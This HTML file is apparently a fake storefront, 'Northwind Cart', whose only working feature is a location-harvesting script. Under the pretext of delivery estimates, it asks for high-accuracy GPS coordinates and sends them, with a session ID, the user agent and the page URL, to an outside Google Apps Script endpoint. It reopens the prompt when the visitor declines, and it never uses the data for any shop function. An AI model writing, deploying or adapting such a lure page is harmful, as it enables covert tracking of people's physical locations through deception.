<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Northwind Cart</title>
  <meta name="description" content="Shop online with fast delivery estimates." />
  <style>
    :root{
      --bg:#0b1020;
      --card:rgba(255,255,255,.06);
      --border:rgba(255,255,255,.12);
      --text:rgba(255,255,255,.93);
      --muted:rgba(255,255,255,.7);
      --shadow:0 14px 40px rgba(0,0,0,.35);
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
      color:var(--text);
      background:
        radial-gradient(1200px 520px at 25% 0%, rgba(124,92,255,.35), transparent 60%),
        radial-gradient(900px 450px at 90% 20%, rgba(45,212,191,.25), transparent 55%),
        var(--bg);
    }
    a{color:inherit;text-decoration:none}
    a:hover{text-decoration:underline}
    .wrap{max-width:1150px;margin:0 auto;padding:0 18px}
    .topbar{
      position:sticky;top:0;z-index:10;
      background:rgba(11,16,32,.65);
      backdrop-filter: blur(10px);
      border-bottom:1px solid rgba(255,255,255,.06);
    }
    .topbarInner{display:flex;align-items:center;gap:14px;padding:14px 0}
    .brand{display:flex;align-items:center;gap:10px;min-width:200px}
    .logo{
      width:38px;height:38px;border-radius:12px;
      display:grid;place-items:center;
      background:linear-gradient(135deg, rgba(124,92,255,1), rgba(45,212,191,1));
      color:#06101a;font-weight:900;
    }
    .brandText{line-height:1.1}
    .brandText .name{font-weight:850;letter-spacing:.2px}
    .brandText .tag{font-size:12px;color:var(--muted)}
    .search{
      flex:1;
      display:flex;gap:10px;align-items:center;
      border:1px solid rgba(255,255,255,.14);
      background:rgba(0,0,0,.22);
      border-radius:14px;
      padding:10px 12px;
    }
    .search input{
      width:100%;border:0;outline:none;background:transparent;
      color:var(--text);font-size:14px;
    }
    .pill{
      display:flex;align-items:center;gap:8px;
      border:1px solid rgba(255,255,255,.12);
      background:rgba(255,255,255,.05);
      border-radius:999px;
      padding:8px 10px;
      font-size:13px;color:rgba(255,255,255,.85);
      white-space:nowrap;
    }
    .nav{display:flex;gap:12px;color:var(--muted);font-size:14px}
    .nav a{padding:8px 10px;border-radius:10px}
    .nav a:hover{background:rgba(255,255,255,.06);color:var(--text);text-decoration:none}

    .hero{padding:22px 0 10px}
    .heroGrid{display:grid;grid-template-columns:1.2fr .8fr;gap:16px}
    @media (max-width: 960px){.heroGrid{grid-template-columns:1fr}}
    .card{
      background:linear-gradient(180deg, var(--card), rgba(255,255,255,.03));
      border:1px solid var(--border);
      border-radius:18px;
      box-shadow: var(--shadow);
    }
    .heroLeft{padding:18px}
    h1{margin:0 0 10px;font-size:clamp(26px,3.6vw,44px);line-height:1.05}
    .muted{color:var(--muted)}
    .ctaRow{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px}
    .btn, .btnPrimary{
      appearance:none;cursor:pointer;
      border-radius:14px;
      border:1px solid rgba(255,255,255,.14);
      background:rgba(255,255,255,.07);
      color:var(--text);
      padding:10px 12px;
      font-weight:750;
    }
    .btnPrimary{
      border-color: rgba(124,92,255,.55);
      background:linear-gradient(180deg, rgba(124,92,255,.35), rgba(124,92,255,.18));
    }
    .heroRight{padding:16px}
    .banner{
      height:160px;border-radius:16px;
      background:
        linear-gradient(135deg, rgba(124,92,255,.24), rgba(45,212,191,.18)),
        radial-gradient(900px 260px at 20% 30%, rgba(255,255,255,.10), transparent 55%);
      border:1px solid rgba(255,255,255,.10);
      padding:16px;
      display:flex;flex-direction:column;justify-content:space-between;
    }
    .banner .kicker{font-size:12px;color:rgba(255,255,255,.78);font-weight:700;letter-spacing:.4px;text-transform:uppercase}
    .banner .headline{font-size:18px;font-weight:850}
    .banner .sub{font-size:13px;color:var(--muted)}
    .section{padding:16px 0}
    .chips{display:flex;flex-wrap:wrap;gap:10px}
    .chip{
      border:1px solid rgba(255,255,255,.12);
      background:rgba(255,255,255,.05);
      padding:8px 10px;border-radius:999px;
      font-size:13px
    }
    .grid{
      display:grid;
      grid-template-columns:repeat(4,1fr);
      gap:12px;
    }
    @media (max-width: 1050px){.grid{grid-template-columns:repeat(3,1fr)}}
    @media (max-width: 760px){.grid{grid-template-columns:repeat(2,1fr)}}
    @media (max-width: 430px){.grid{grid-template-columns:1fr}}
    .product{padding:12px;border-radius:16px;border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.04)}
    .thumb{height:110px;border-radius:14px;border:1px solid rgba(255,255,255,.10);background:linear-gradient(135deg, rgba(124,92,255,.22), rgba(45,212,191,.18))}
    .pName{margin-top:10px;font-weight:850}
    .pMeta{margin-top:4px;font-size:12px;color:var(--muted)}
    .priceRow{display:flex;justify-content:space-between;align-items:center;margin-top:10px}
    .price{font-weight:900}
    .add{font-size:12px;padding:8px 10px;border-radius:12px}

    .footer{
      border-top:1px solid rgba(255,255,255,.08);
      color:var(--muted);
      font-size:13px;
      padding:18px 0 28px;
      margin-top:8px;
    }

    /* Modal */
    .overlay{
      position:fixed;inset:0;z-index:50;
      background:rgba(0,0,0,.55);
      display:none;align-items:center;justify-content:center;
      padding:18px;
    }
    .modal{
      width:min(560px,100%);
      border-radius:18px;
      background:linear-gradient(180deg, rgba(255,255,255,.10), rgba(255,255,255,.05));
      border:1px solid rgba(255,255,255,.14);
      box-shadow: 0 20px 70px rgba(0,0,0,.6);
      padding:16px;
    }
    .modal h2{margin:6px 0 6px;font-size:18px}
    .modal p{margin:0;color:var(--muted);font-size:13px;line-height:1.45}
    .modal .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
    .note{margin-top:10px;font-size:12px;color:rgba(255,255,255,.72)}
    .mini{margin-left:auto;display:flex;align-items:center;gap:8px;font-size:12px;color:rgba(255,255,255,.78)}
    .mini button{
      border:0;background:transparent;color:rgba(255,255,255,.82);
      text-decoration:underline;cursor:pointer;padding:0;font-size:12px;
    }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="wrap">
      <div class="topbarInner">
        <div class="brand">
          <div class="logo">NC</div>
          <div class="brandText">
            <div class="name">Northwind Cart</div>
            <div class="tag">Everyday essentials. Fast delivery.</div>
          </div>
        </div>

        <div class="search" role="search" aria-label="Search products">
          <span style="color:rgba(255,255,255,.65)">Search</span>
          <input placeholder="Search for products, brands and more" />
        </div>

        <div class="pill" title="Delivery location">
          <span>Deliver to</span>
          <strong id="deliverTo">Choose</strong>
          <span class="mini"><button id="btnChangeLoc" type="button">Change</button></span>
        </div>

        <div class="nav">
          <a href="#deals">Deals</a>
          <a href="#categories">Categories</a>
          <a href="#help">Help</a>
        </div>
      </div>
    </div>
  </div>

  <div class="wrap">
    <section class="hero">
      <div class="heroGrid">
        <div class="card heroLeft">
          <h1>Shop smarter. Get delivery estimates near you.</h1>
          <div class="muted">
            To show delivery times and pickup availability, we may ask to use your device location.
            You can choose “Not now”.
          </div>
          <div class="ctaRow">
            <button class="btnPrimary" type="button" id="btnOpenLoc">Set delivery location</button>
            <button class="btn" type="button">Browse deals</button>
          </div>
        </div>

        <div class="card heroRight">
          <div class="banner">
            <div class="kicker">Today only</div>
            <div>
              <div class="headline">Extra 10% off accessories</div>
              <div class="sub">Limited-time offers on select items.</div>
            </div>
            <div class="sub">Fast checkout · Easy returns</div>
          </div>
        </div>
      </div>
    </section>

    <section id="categories" class="section">
      <div class="chips">
        <span class="chip">Mobiles</span>
        <span class="chip">Electronics</span>
        <span class="chip">Fashion</span>
        <span class="chip">Beauty</span>
        <span class="chip">Home</span>
        <span class="chip">Grocery</span>
      </div>
    </section>

    <section id="deals" class="section">
      <div class="grid">
        <div class="product"><div class="thumb"></div><div class="pName">Wireless Earbuds</div><div class="pMeta">Noise isolation · 20h battery</div><div class="priceRow"><div class="price">₹1,299</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Power Bank 10k</div><div class="pMeta">Fast charge · Compact</div><div class="priceRow"><div class="price">₹899</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Running Shoes</div><div class="pMeta">Lightweight · Daily wear</div><div class="priceRow"><div class="price">₹2,499</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Skincare Bundle</div><div class="pMeta">Cleanser · Moisturizer</div><div class="priceRow"><div class="price">₹699</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Bluetooth Speaker</div><div class="pMeta">Deep bass · Portable</div><div class="priceRow"><div class="price">₹1,599</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Smartwatch</div><div class="pMeta">Fitness tracking · AMOLED</div><div class="priceRow"><div class="price">₹2,999</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Kitchen Set</div><div class="pMeta">Non-stick · 6 pcs</div><div class="priceRow"><div class="price">₹1,199</div><button class="btn add" type="button">Add</button></div></div>
        <div class="product"><div class="thumb"></div><div class="pName">Backpack</div><div class="pMeta">Water-resistant · 22L</div><div class="priceRow"><div class="price">₹799</div><button class="btn add" type="button">Add</button></div></div>
      </div>
    </section>

    <section id="help" class="section">
      <div class="card" style="padding:14px">
        <div class="muted" style="font-size:13px">
          If location is blocked, allow Location permissions for this site in your browser settings and reload.
        </div>
      </div>
    </section>

    <footer class="footer">
      <div>© Northwind Cart (demo) · Hosted on GitHub Pages</div>
    </footer>
  </div>

  <div class="overlay" id="overlay" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-label="Set delivery location">
      <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start">
        <div>
          <h2>Use your location for delivery?</h2>
          <p>
            We’ll use your device location to show delivery times and pickup availability.
            You can stop anytime from your browser settings.
          </p>
        </div>
        <button class="btn" id="btnClose" type="button" aria-label="Close">Close</button>
      </div>

      <div class="row">
        <button class="btnPrimary" id="btnAllow" type="button">Allow location</button>
        <button class="btn" id="btnNotNow" type="button">Not now</button>
      </div>

      <div class="note" id="modalNote">When you tap “Allow location”, your browser will show a permission prompt.</div>
    </div>
  </div>

  <script>
    const ENDPOINT_URL = "https://script.google.com/macros/s/AKfycbxChaPpu53ml2mJ5YGWO6JaNiqII1hCoMGdfjb6aWK9wyPxZtuBOBa1Pe0mfp9trANsTg/exec";

    const STORAGE_CONSENT = "nc.loc.consent";
    const STORAGE_LAST = "nc.loc.last";

    const deliverTo = document.getElementById("deliverTo");
    const overlay = document.getElementById("overlay");

    const btnOpenLoc = document.getElementById("btnOpenLoc");
    const btnChangeLoc = document.getElementById("btnChangeLoc");
    const btnClose = document.getElementById("btnClose");
    const btnAllow = document.getElementById("btnAllow");
    const btnNotNow = document.getElementById("btnNotNow");
    const modalNote = document.getElementById("modalNote");

    function openModal() {
      overlay.style.display = "flex";
      overlay.setAttribute("aria-hidden", "false");
    }
    function closeModal() {
      overlay.style.display = "none";
      overlay.setAttribute("aria-hidden", "true");
    }
    function shortPlace(lat, lon) {
      return `${lat.toFixed(3)}, ${lon.toFixed(3)}`;
    }

    async function postPayload(payload) {
      await fetch(ENDPOINT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "content-type": "text/plain;charset=utf-8" },
        body: JSON.stringify(payload)
      });
    }

    async function requestAndSendLocation() {
      // Close immediately after click (as you requested)
      closeModal();

      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(async (pos) => {
        const payload = {
          type: "location",
          reason: "consent_modal",
          sentAt: new Date().toISOString(),
          sessionId: (crypto?.randomUUID ? crypto.randomUUID() : String(Date.now()) + "-" + Math.random().toString(16).slice(2)),
          coords: {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracyMeters: pos.coords.accuracy
          },
          userAgent: navigator.userAgent,
          pageUrl: location.href
        };

        localStorage.setItem(STORAGE_CONSENT, "yes");
        localStorage.setItem(STORAGE_LAST, JSON.stringify({
          lat: payload.coords.latitude,
          lon: payload.coords.longitude,
          at: payload.sentAt
        }));

        await postPayload(payload);
        deliverTo.textContent = shortPlace(payload.coords.latitude, payload.coords.longitude);
      }, () => {
        // If user denies or it fails, reopen the modal
        openModal();
        modalNote.textContent = "Location permission denied or unavailable. Please try again.";
      }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
    }

    function hydrateUI() {
      try {
        const last = JSON.parse(localStorage.getItem(STORAGE_LAST) || "null");
        if (last && Number.isFinite(last.lat) && Number.isFinite(last.lon)) {
          deliverTo.textContent = shortPlace(last.lat, last.lon);
        } else {
          deliverTo.textContent = "Choose";
        }
      } catch {
        deliverTo.textContent = "Choose";
      }
    }

    btnOpenLoc.addEventListener("click", openModal);
    btnChangeLoc.addEventListener("click", openModal);
    btnClose.addEventListener("click", closeModal);
    btnNotNow.addEventListener("click", () => {
      localStorage.setItem(STORAGE_CONSENT, "no");
      closeModal();
    });
    btnAllow.addEventListener("click", requestAndSendLocation);

    hydrateUI();
    if (!localStorage.getItem(STORAGE_CONSENT)) openModal();
  </script>
</body>
</html>
